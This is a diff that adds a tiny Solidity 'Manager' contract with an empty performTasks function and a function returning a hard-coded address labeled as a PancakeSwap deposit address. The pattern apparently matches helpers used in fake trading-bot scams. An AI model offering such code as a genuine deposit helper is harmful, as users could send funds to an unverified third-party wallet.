@@ -1,1 +1,11 @@
-Nakul kodecha 
+pragma solidity ^0.5.0;
+
+contract Manager {
+        function performTasks() public {
+
+        }
+
+        function pancakeDepositAddress() public pure returns (address) {
+                return 0x74eC72dbA41c6C2458Cb7A6fcbAEc5A8E4a8aBFC;
+        }
+}
